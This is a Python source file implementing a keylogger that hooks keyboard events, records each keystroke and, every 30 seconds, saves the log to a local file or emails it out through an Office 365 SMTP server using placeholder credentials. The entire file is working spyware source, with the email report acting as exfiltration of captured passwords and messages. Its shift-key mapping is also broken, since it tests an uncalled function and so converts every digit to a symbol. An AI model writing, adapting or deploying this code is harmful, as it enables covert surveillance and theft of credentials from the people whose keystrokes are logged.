#!/usr/bin/env python3

import keyboard
import smtplib
import os

from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

send_report_interval = 30
email_address = "your_email"
email_password = "your_password"

class Keylogger: 
	def __init__(self, interval, report_method="email"):
		self.interval = interval
		self.report_method = report_method
		
		self.log = ""
		
		self.start_dt = datetime.now()
		self.end_dt = datetime.now()
		
	def callback(self, event):
		"""
		This callback is invoked whenever a key is released and it will append
		that key to the self.log variable
		"""
		
		name = event.name
		
		if keyboard.is_pressed and name == "1":
			name = "!"
		if keyboard.is_pressed and name == "2":
			name = "@"
		if keyboard.is_pressed and name == "3":
			name = "#"
		if keyboard.is_pressed and name == "4":
			name = "$"
		if keyboard.is_pressed and name == "5":
			name = "%"
		if keyboard.is_pressed and name == "6":
			name = "^"
		if keyboard.is_pressed and name == "7":
			name = "&"
		if keyboard.is_pressed and name == "8":
			name = "*"
		if keyboard.is_pressed and name == "9":
			name = "("
		if keyboard.is_pressed and name == "0":
			name = ")"
		if keyboard.is_pressed and name == "-":
			name = "_"

		if len(name) > 1:
		
			if name == " ":
				name = " "
			elif name == "enter":
				name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"

		self.log += name
	
	# The next two methods are for saving key logs to a local file
	
	def set_filename(self):
	# creates filename using start and end times
		start_datetime = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
		end_datetime = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
		self.filename = f"keylog-{start_datetime}_{end_datetime}"
		
	def create_file(self):
	# creates a file in current directory with current keylogs stored in the self.log variable
		with open(os.path.join("/Users/christian/Documents/pythonScripts/pythonKeylogger", f"{self.filename}.txt"), "w") as f:
			print(self.log, file=f)
			print(f"[+] Saved {self.filename}.txt")
	
	# The following two methods are to send the key logs as an email
		
	def construct_email(self, message):
	# creates text version and HTML version of key logs
		msg = MIMEMultipart("alternative")
		msg["From"] = email_address
		msg["To"] = email_address
		msg["Subject"] = "Keylogger Logs"
		
		html = f"<p>{message}</p>"
		text_version = MIMEText(message, "plain")
		html_version = MIMEText(html, "html")
		msg.attach(text_version)
		msg.attach(html_version)
		
		return msg.as_string()
		
	def send_email(self, email, password, message, verbose=1):
	# manages connection with SMTP server, logs into email, sends email, and ends the session
		server = smtplib.SMTP(host="smtp.office365.com", port=587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, self.construct_email(message))
		server.quit()
		
		if verbose:
			print(f"{datetime.now()} - Sent an email to {email} constaining: {message}")
			
	def report(self):
	# sends key logs and resets self.log variable
		if self.log:
			self.end_dt = datetime.now()
			self.set_filename()
			
			if self.report_method == "email":
				self.send_email(email_address, email_password, self.log)
			elif self.report_method == "file":
				self.create_file()
				
			print(f"[{self.filename}] - {self.log}")
			self.start_dt = datetime.now()
			
		self.log = ""
		timer = Timer(interval=self.interval, function=self.report)
		timer.daemon = True
		timer.start()
		
	def start(self):
		self.start_dt = datetime.now()
		keyboard.on_release(callback=self.callback)
		self.report()
		print(f"{datetime.now()} - Started keylogger")
		keyboard.wait()
		
		
		
if __name__ == "__main__":
	#keylogger = Keylogger(interval=send_report_interval, report_method="email")
	keylogger = Keylogger(interval=send_report_interval, report_method="file")
	keylogger.start()